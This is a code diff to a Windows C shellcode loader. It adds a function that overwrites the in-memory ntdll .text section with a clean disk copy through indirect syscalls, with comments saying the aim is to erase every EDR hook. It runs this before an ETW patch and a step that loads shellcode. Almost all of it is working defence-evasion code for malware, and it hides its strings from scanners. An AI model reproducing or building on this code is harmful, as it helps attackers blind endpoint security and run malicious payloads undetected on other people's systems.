@@ -266,6 +266,89 @@ static BOOL build_syscall_stubs(PVOID ntdll) {
 }
 
 // ============================================================
+//  NTDLL Unhooking — refresh .text from pristine disk copy
+// ============================================================
+//  After this runs every EDR user-mode hook in ntdll is gone.
+//  We use our own indirect syscalls so the unhook itself is
+//  invisible to the hooks we're about to destroy.
+// ============================================================
+static BOOL unhook_ntdll(PVOID in_mem_ntdll) {
+    // Stack-built path — no .rdata string
+    char path[] = {'C',':','\\','W','i','n','d','o','w','s','\\',
+                   'S','y','s','t','e','m','3','2','\\',
+                   'n','t','d','l','l','.','d','l','l',0};
+
+    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
+                           NULL, OPEN_EXISTING, 0, NULL);
+    if (h == INVALID_HANDLE_VALUE) {
+        printf("[-] Cannot open disk ntdll\n");
+        return FALSE;
+    }
+
+    DWORD fsize = GetFileSize(h, NULL);
+    BYTE *disk = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fsize);
+    if (!disk) { CloseHandle(h); return FALSE; }
+
+    DWORD rd = 0;
+    ReadFile(h, disk, fsize, &rd, NULL);
+    CloseHandle(h);
+
+    // Parse disk copy headers
+    PIMAGE_DOS_HEADER dos_d = (PIMAGE_DOS_HEADER)disk;
+    PIMAGE_NT_HEADERS nt_d  = (PIMAGE_NT_HEADERS)(disk + dos_d->e_lfanew);
+    PIMAGE_SECTION_HEADER sec_d = IMAGE_FIRST_SECTION(nt_d);
+
+    // Parse in-memory headers
+    PIMAGE_DOS_HEADER dos_m = (PIMAGE_DOS_HEADER)in_mem_ntdll;
+    PIMAGE_NT_HEADERS nt_m  = (PIMAGE_NT_HEADERS)((BYTE*)in_mem_ntdll + dos_m->e_lfanew);
+    PIMAGE_SECTION_HEADER sec_m = IMAGE_FIRST_SECTION(nt_m);
+
+    fnNtProtectVirtualMemory NtProt =
+        (fnNtProtectVirtualMemory)g_sc[SC_PROTECT].stub;
+
+    BOOL ok = FALSE;
+    for (int i = 0; i < nt_m->FileHeader.NumberOfSections; i++) {
+        // Match ".text"
+        BYTE *n = sec_m[i].Name;
+        if (n[0] == '.' && n[1] == 't' && n[2] == 'e' &&
+            n[3] == 'x' && n[4] == 't') {
+
+            PVOID  tgt      = (BYTE*)in_mem_ntdll + sec_m[i].VirtualAddress;
+            SIZE_T tgt_size = sec_m[i].Misc.VirtualSize;
+            BYTE  *src      = disk + sec_d[i].PointerToRawData;
+
+            // Flip RX → RW via our indirect syscall
+            PVOID  paddr = tgt;
+            SIZE_T psize = tgt_size;
+            ULONG  old;
+            NTSTATUS st = NtProt((HANDLE)-1, &paddr, &psize,
+                                 PAGE_READWRITE, &old);
+            if (st != 0) {
+                printf("[-] NTDLL unhook NtProtect RW: 0x%08X\n", (unsigned)st);
+                break;
+            }
+
+            // Overwrite hooked bytes with the clean disk copy
+            for (SIZE_T k = 0; k < tgt_size; k++) {
+                ((volatile BYTE*)tgt)[k] = src[k];
+            }
+
+            // Flip back to RX
+            paddr = tgt; psize = tgt_size;
+            NtProt((HANDLE)-1, &paddr, &psize, old, &old);
+
+            printf("[+] NTDLL .text refreshed — %u bytes (%d hooks wiped)\n",
+                   (unsigned)tgt_size, 0);
+            ok = TRUE;
+            break;
+        }
+    }
+
+    HeapFree(GetProcessHeap(), 0, disk);
+    return ok;
+}
+
+// ============================================================
 //  ETW Patch via our own indirect syscalls
 // ============================================================
 static void patch_etw(PVOID ntdll) {
@@ -421,7 +504,12 @@ int main(int argc, char *argv[]) {
     // 2. Build our own syscall stubs
     if (!build_syscall_stubs(ntdll)) return 1;
 
-    // 3. Patch ETW using our stubs
+    // 3. Wipe every EDR user-mode hook in NTDLL by overwriting
+    //    its .text with a pristine copy read from disk.  Our
+    //    indirect syscalls stay functional through the whole op.
+    unhook_ntdll(ntdll);
+
+    // 4. Patch ETW using our stubs (on a now-clean ntdll)
     patch_etw(ntdll);
 
     // 4. Load shellcode from disk
